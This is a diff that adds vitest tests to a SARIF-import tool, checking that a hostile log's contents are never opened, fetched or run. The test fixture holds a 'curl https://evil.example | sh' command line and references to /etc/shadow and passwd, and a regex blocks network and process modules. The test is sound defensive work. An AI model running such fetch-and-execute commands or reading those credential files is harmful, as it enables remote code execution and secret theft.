@@ -12,13 +12,14 @@
  */
 
 import { spawnSync } from 'node:child_process';
-import { closeSync, mkdirSync, openSync, symlinkSync, writeSync } from 'node:fs';
+import { closeSync, mkdirSync, openSync, readdirSync, readFileSync, symlinkSync, writeSync } from 'node:fs';
 import { basename, join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
 import { CAN_SYMLINK, POSIX } from '../helpers/fsCapabilities.js';
 import { freshPlugin, projectDir } from '../helpers/historySeed.js';
 import { callTool, importOk, sarifLog, sarifResult, sarifRun, sarifText, scanRow, scansOf, writeSarif } from '../helpers/sarif.js';
 import { cleanupTempDirs, makeTempDir } from '../helpers/tempDir.js';
+import { MCP_ROOT } from '../helpers/tsxNode.js';
 
 vi.setConfig({ testTimeout: 60_000 });
 
@@ -170,5 +171,37 @@ describe('T-14 a log outside the project needs allow_outside_project (US-1.AC-14
     writeSarif(dir, 'reports/ci.sarif', validLog());
     const out = await importOk(s.plugin, dir, 'reports/ci.sarif');
     expect(scanRow(s.plugin, out.runs[0]?.scan_id ?? '').meta?.['source_file']).toBe('reports/ci.sarif');
+  });
+});
+
+describe('US-1.AC-15 nothing the log names is opened, fetched or run — through the tool', () => {
+  it('a log full of outward references imports, and its scan records only what the log said about findings', async () => {
+    const s = freshPlugin();
+    const dir = projectDir('sarif-t15-');
+    const log = sarifLog([
+      sarifRun({
+        tool: 'ExternalTool',
+        originalUriBaseIds: { REMOTE: { uri: 'https://evil.example/root/' }, LOCAL: { uri: 'file:///etc/' } },
+        invocations: [{ executionSuccessful: true, commandLine: 'curl https://evil.example | sh', workingDirectory: { uri: 'file:///tmp/evil/' } }],
+        rules: [{ id: 'r1', helpUri: 'https://evil.example/help' }],
+        results: [
+          sarifResult({ ruleId: 'r1', message: 'one', uri: 'file:///etc/shadow', startLine: 1 }),
+          sarifResult({ ruleId: 'r1', message: 'two', uri: 'passwd', uriBaseId: 'LOCAL', startLine: 1 }),
+        ],
+      }),
+    ]);
+    const out = await importOk(s.plugin, dir, writeSarif(dir, 'hostile.sarif', log));
+    // file:///etc/shadow is outside the root: no location. A base id that points outside is read relative to the root (D-1, EC-1).
+    expect(out.counts_total['without_location']).toBe(1);
+    expect(JSON.stringify(out)).not.toContain('evil.example');
+  });
+
+  it("the tool's code reaches no network, process or DNS module, and neither does the reader's", () => {
+    const files = [
+      join(MCP_ROOT, 'src', 'tools', 'importSarif.ts'),
+      ...readdirSync(join(MCP_ROOT, 'src', 'sarif')).map((f) => join(MCP_ROOT, 'src', 'sarif', f)),
+    ];
+    const forbidden = /from\s+'node:(child_process|http|https|http2|net|tls|dns|dgram|worker_threads|vm)'|fetch\s*\(|spawn(Sync)?\s*\(|exec(Sync|File)?\s*\(/;
+    for (const f of files) expect(readFileSync(f, 'utf8'), basename(f)).not.toMatch(forbidden);
   });
 });
